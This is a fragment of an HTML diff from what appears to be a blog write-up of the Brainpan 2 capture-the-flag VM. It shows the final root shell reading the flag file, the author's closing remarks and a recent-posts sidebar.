+</span><span class="line output">Last login: Thu May 22 05:48:53 2014 from localhost
+</span><span class="line output">root @brainpan2:~# cat /root/flag.txt
+</span><span class="line output">cat /root/flag.txt
+</span><span class="line output">
+</span><span class="line output">                          !!! CONGRATULATIONS !!!
+</span><span class="line output">
+</span><span class="line output">                 You've completed the Brainpan 2 challenge! 
+</span><span class="line output">                 Or have you...? 
+</span><span class="line output">
+</span><span class="line output">                 Yes, you have! Pat yourself on the back. :-)
+</span><span class="line output">
+</span><span class="line output">                 Questions, comments, suggestions for new VM
+</span><span class="line output">                 challenges? Let me know! 
+</span><span class="line output">
+</span><span class="line output">
+</span><span class="line output">                 Twitter: @superkojiman
+</span><span class="line output">                 Email  : contact@techorganic.com
+</span><span class="line output">                 Web    : http://www.techorganic.com
+</span><span class="line output">
+</span><span class="line output">root @brainpan2:~# id
+</span><span class="line output">id
+</span><span class="line output">uid=0(root ) gid=0(root ) groups=0(root )
+</span><span class="line output">root @brainpan2:~#</span></code></pre></td></tr></table></div></div>
         </div>
 
+<strong> Done! Brainpan2 is solved! Remember that, this is the way that I solved but there is maybe others ways to capture the flag. </strong> 
 
-<p><strong> Done! Brainpan2 is solved! Remember that, this is the way that I solved but there is maybe others ways to capture the flag. </strong></p>
+Hope you like! 
 
-<p>Hope you like!</p>
+
+
+
+
+
+
+
+
+</p></section></p></section></p></section></p></section>
 
 
 </article>
@@ -500,6 +464,10 @@ mv .ssh .bash* .backup
   <section id="recent-posts" class="aside-module grid__item one-whole lap-one-half">
   <h1 class="title delta">Recent Posts</h1>
   <ul class="divided">
+    
+      <li class="post">
+        <a href="/blog/2014/06/03/xssing-google-game/">XSSing - Google Game</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2014/05/23/secos-writeup/">SecOS - Writeup</a>
